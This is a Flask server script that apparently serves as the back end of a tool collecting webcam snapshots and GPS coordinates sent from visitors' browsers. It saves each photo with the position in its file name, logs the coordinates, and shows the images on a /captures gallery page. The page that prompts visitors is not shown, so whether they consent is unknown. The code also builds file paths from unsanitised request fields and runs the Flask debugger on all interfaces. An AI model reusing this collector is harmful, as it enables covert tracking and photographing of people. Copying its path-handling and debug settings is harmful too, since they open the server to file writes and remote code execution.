from flask import Flask, request, render_template
from flask import send_from_directory
import os
import base64
from datetime import datetime

app = Flask(__name__)

CAPTURE_FOLDER = 'static/captures'
os.makedirs(CAPTURE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/captures')
def show_captures():
    files = sorted(os.listdir(CAPTURE_FOLDER), reverse=True)
    image_urls = [
        {
            "filename": file,
            "url": f"/static/captures/{file}",
            "info": file.replace(".jpg", "").replace("_", " | ")
        }
        for file in files if file.endswith(".jpg")
    ]
    return render_template("captures.html", images=image_urls)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()
    lat = data.get('lat')
    lon = data.get('lon')
    image_data = data.get('image')

    if not lat or not lon or not image_data:
        return {"status": "error", "message": "Missing data"}, 400

    # Decode base64 image
    image_data = image_data.split(',')[1]
    img_bytes = base64.b64decode(image_data)

    # Generate timestamped filename
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{timestamp}_lat{lat}_lon{lon}.jpg"
    filepath = os.path.join(CAPTURE_FOLDER, filename)

    # Save image
    with open(filepath, 'wb') as f:
        f.write(img_bytes)

    # ✅ Save location details in a separate log file
    with open("location_log.txt", "a") as log:
        log.write(f"[{timestamp}] Latitude: {lat}, Longitude: {lon}\n")

    print(f"[INFO] Image saved: {filepath}")
    print(f"[INFO] Location logged: lat={lat}, lon={lon}")

    return {"status": "success", "message": "Image and location saved"}

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=5000)